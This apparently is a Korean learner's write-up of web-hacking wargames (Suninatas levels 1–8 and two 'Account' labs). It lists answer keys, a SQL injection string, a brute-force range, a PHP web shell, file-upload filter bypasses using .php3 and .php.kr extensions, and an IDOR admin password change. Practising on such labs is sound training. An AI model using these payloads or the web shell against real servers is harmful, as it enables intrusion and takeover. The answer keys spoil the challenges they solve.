## 써니나타스 Level 1~8

접속 정보: `kali11 / 1234`

| Level | 핵심 기법 | 정답/결과 |
|---|---|---|
| 1 | 문자열 치환 + substring 연산 역추적 | `ami` → `admin` |
| 2 | 개발자도구 콘솔에서 폼 강제 submit | `document.web02.submit()` |
| 3 | free 게시판에 글쓰기 | 게시글 작성으로 인증키 획득 |
| 4 | Burp Repeater로 User-Agent 값 반복 변조 | `User-Agent: SuNiNaS`, 25→50까지 반복 전송 |
| 5 | JS 난독화 + `eval()` 역분석 | `PASS()` 함수가 반환하는 `9c43c20c`를 인증키 입력창에 대입 |
| 6 | SQL Injection (문자열 컬럼) | `1' or '1' like '1` |
| 7 | 키 이벤트(keyCode) 우회 | 콘솔에서 `frn.submit()` 직접 실행 |
| 8 | Burp Intruder 브루트포스 | 비밀번호 4자리 범위(7200~9999) 무차별 대입 |

### Level 1 상세 - 문자열 치환 로직 역추적

```
초기 입력값(str): ami
1차 치환 (a → aad): aadmi
2차 치환 (i → in):  aadmin

result1 = substr(str, 2, 2)  → "ad"   (aa[ad]min)
result2 = substr(str, 4, 6)  → "min"  (aad[min])

최종 Authkey = result1 + result2 = "admin"
```

### Level 5 상세 - 난독화된 검증 함수

`eval()`은 문자열로 된 코드를 실제 코드처럼 실행해주는 함수라, 페이지 소스가 난독화되어 있어도 결국 특정 값을 만들어내는 **정답 변환기(계산기)** 역할을 한다는 점이 핵심이었습니다. 난독화 코드 안의 `PASS()` 함수가 계산해낸 결과값(`9c43c20c`)을 그대로 인증키 입력창에 넣으면 통과되는 구조였습니다.

## Account 워게임 - 확장자 필터 우회로 웹쉘 획득

### 1) 회원가입 단계 프록시 조작
ZAP(또는 Burp)으로 회원가입 요청에 브레이크포인트를 걸고, 유저 값을 `admin`으로 바꿔서 전송 → 관리자 전용 "파일 올리기" 메뉴 접근 권한 획득.

### 2) 1차 시도 - 이중 확장자 실패
`cmd.php.jpg`처럼 업로드해봤지만, 서버가 파일명에 `php` 문자열이 포함된 걸 감지해서 업로드 자체를 막거나 강제로 `.txt`로 변환해버림. ZAP으로 요청/응답을 다시 확인해가며 필터 동작을 역추적.

### 3) 성공 - `.php3` 확장자
```
cmd.php3
```
```php
<?php
    system($_GET['cmd']);
?>
```
업로드 후:
```
http://<target>/files/cmd.php3?cmd=id
```

**동작 원리**
- `$_GET['cmd']` : URL의 `?cmd=` 뒤에 오는 쿼리 파라미터 값을 가져옴
- `system(...)` : 전달받은 문자열을 서버 OS 명령어로 그대로 실행
- 결과적으로 `system("id")`가 실행되어 웹 서버 프로세스 권한(`www-data` 등)이 그대로 출력됨

### 4) 후속 - 취약점 스캔 & 서버 내부 확인
- ZAP Active Scan으로 추가 공격 지점 자동 탐색
- 웹쉘로 `cd /var/www` → `ls`로 서버 내부 디렉토리 구조 확인

## Account2 워게임 - IDOR로 관리자 비밀번호 변경

### 1) 문제 힌트
> "타인의 비밀번호 변경 취약점을 찾아라"

### 2) 회원정보수정 폼 소스 분석
```html
<input type='text' name='userId' tabindex='2' value='b' />
```

정상적으로 설계됐다면 이 아이디 필드는:
- `type='hidden'`이거나
- `readonly` / `disabled` 속성이 붙어있거나
- 서버가 **세션에 저장된 로그인 아이디**를 기준으로 수정 대상을 결정해야 함

그런데 이 필드는 `type='text'`로 **사용자가 직접 편집 가능한 상태로 노출**되어 있었습니다.

### 3) 취약점 유형: IDOR (Insecure Direct Object Reference)
서버(`accupdate_ok.php`)가 "요청을 보낸 사람이 누구인지(세션)"가 아니라 **"폼에 담겨 온 userId 값"을 그대로 신뢰**해서 그 계정의 정보를 수정해버리는 구조. 즉, 로그인은 일반 계정(`b`)으로 되어 있어도 폼의 아이디 값만 `admin`으로 바꿔서 제출하면 관리자 계정 비밀번호가 변경됨.

**공격 절차**
1. 일반 계정(`b`)으로 로그인
2. "회원정보수정" 페이지 진입
3. 아이디 입력란 값을 `b` → `admin`으로 수정
4. 새 비밀번호 입력 후 제출
5. 로그아웃 → `admin` / 새 비밀번호로 재로그인 성공

### 4) 관리자 권한으로 웹쉘 업로드 - 확장자 글로벌리제이션 우회

이 서버는 파일명에 `php` 문자열이 포함되면 대소문자 관계없이 자동으로 `.txt`로 변환해버리는 강력한 블랙리스트 필터가 적용되어 있었습니다 (`cmd.php`, `cmd.PHP`, `cmd.phtml`, `cmd.php3`, `cmd.php5` 모두 실행 실패).

**우회 성공 케이스**
```
cmd.php.kr
```
```
curl "http://<target>/files/cmd.php.kr?cmd=id"
```

**동작 원리**
- 업로드 필터는 파일명 마지막 확장자(`.kr`)만 검사해서 안전하다고 판단 → 통과
- Apache는 파일명에 여러 확장자가 붙어 있으면 각 확장자 토큰을 독립적으로 해석 (다국어 콘텐츠 협상용 `AddLanguage` 등 국제화(Globalization/i18n) 관련 확장자 처리 방식과 맞물림)
- `.kr` 앞의 `.php` 토큰은 여전히 `AddType application/x-httpd-php .php` 설정에 의해 MIME 타입이 PHP로 인식되어 **실제로 실행됨**

## 오늘의 회고

- 써니나타스는 기초 개념(문자열 처리, 콘솔 조작, SQLi, 브루트포스) 위주라 워밍업으로 적당했고, Account/Account2는 **필터 우회 + 권한 검증 누락**을 실전처럼 조합해야 해서 훨씬 실무 감각에 가까웠습니다.
- 확장자 필터를 "php라는 글자가 있으면 무조건 차단"으로 짜더라도, **Apache가 다중 확장자를 각각 독립적으로 해석**한다는 서버 설정 특성을 모르면 필터가 무의미해질 수 있다는 걸 직접 체감했습니다.
- Account2의 IDOR은 코드 몇 줄 문제가 아니라, **"클라이언트가 보낸 값을 서버가 그대로 신뢰"**하는 설계 자체의 문제라는 점에서 인상 깊었습니다. 폼 필드 하나가 `hidden`이었는지 `text`였는지 차이가 권한 우회로 직결됐습니다.
- 다음엔 이번에 성공한 `.php.kr` 같은 다중 확장자 우회가 다른 언어 코드(`.en`, `.jp` 등)에서도 동일하게 먹히는지, 그리고 필터 로직을 화이트리스트 방식으로 바꾸면 어떻게 막히는지 방어자 관점에서도 정리해볼 계획입니다.
